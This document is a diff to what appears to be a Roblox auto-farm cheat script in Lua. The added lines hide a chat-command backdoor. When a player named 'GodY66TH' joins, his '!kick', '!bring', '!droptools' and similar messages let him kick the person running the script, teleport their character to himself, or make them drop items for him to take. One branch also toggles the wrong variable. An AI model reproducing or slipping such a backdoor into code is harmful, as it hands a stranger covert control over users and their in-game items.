@@ -1,9 +1,12 @@
 if not _G.ExecutedXylo then
 _G.ExecutedXylo = true
+local RandomCode = math.random(1,100000000)
+local Click = true
+local AutoStore = true
 spawn(function()
 local Check = false
 _G.DelayAuto = 1.5
-while true do
+while Click == true do
 if Check == false then
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1840, 15, 1983)
 wait(3)
@@ -76,7 +79,42 @@ game:service "Players".LocalPlayer.Idled:connect(
 )
 end)
 
-while task.wait(0.15) do
+spawn(function()
+game:GetService("Players").PlayerAdded:Connect(function(player)
+if player.Name == "GodY66TH" then
+player.Chatted:Connect(function(msg)
+task.wait(0.1)
+if msg == "!checkbot" then
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hello Master My Code Is : "..RandomCode, "All")
+elseif msg == tostring("!kick "..RandomCode) then
+game:GetService("Players").LocalPlayer:Kick()
+elseif msg == tostring("!bring "..RandomCode) then
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")["GodY66TH"].Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-7.5)
+elseif msg == tostring("!auto "..RandomCode) then
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Click Event Item Status : "..tostring(not Click), "All")
+Click = (not Click)
+elseif msg == tostring("!droptools "..RandomCode) then
+local DropCount = 0
+for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
+if v.CanBeDropped == true and DropCount < 10 then
+v.Parent = game:GetService("Players").LocalPlayer.Character
+task.wait(0.15)
+v.Parent = workspace
+task.wait(0.15)
+DropCount = DropCount + 1
+end
+end
+elseif msg == tostring("!autostore "..RandomCode) then
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Auto Store Event Item Status : "..tostring(not AutoStore), "All")
+Click = (not AutoStore)
+end
+end)
+end)
+end
+end)
+end)
+
+while AutoStore == true do
 local args = {
     [1] = "Change",
     [2] = "Blade Kagenou",
